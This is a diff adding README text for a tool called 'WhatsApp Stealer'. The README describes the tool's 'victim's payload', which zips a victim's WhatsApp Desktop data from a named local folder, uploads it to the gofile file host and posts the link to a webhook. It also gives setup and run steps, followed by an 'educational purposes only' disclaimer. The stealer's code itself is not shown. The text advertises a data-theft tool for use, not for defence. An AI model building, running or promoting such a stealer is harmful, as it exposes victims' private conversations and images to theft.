@@ -15,4 +15,23 @@
     </b>
 </div>
 
-still working on it the stuff is going to be released soon but you can actually use it
+## WhatsApp Stealer 🪖
+
+This program steal the victim's WhatsApp data such as profil pictures of conversations and stuff
+Actually except that I don't really know how to use the other data but this is still interesting and this could be investigated later
+
+## How to use 📖
+
+Just download this repository
+Make sure you have python and the requirements installed (pip install -r requirements.txt)
+Start main.py 
+
+## How it works 🤔
+
+The victim's payload will actually make a zip of all the WhatsApp data located at `LOCALAPPDATA\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm` 
+Then, it's gonna uplaod it to the gofile API and send to the webhook the link
+
+This is for educational purposes only, use at your own risk, I am not responsible for any of your actions!
+This project is licensed under the <a href="https://mit-license.org/.">MIT License</a>
+
+<p align="center"><a href=#top>Back to Top</a></p>
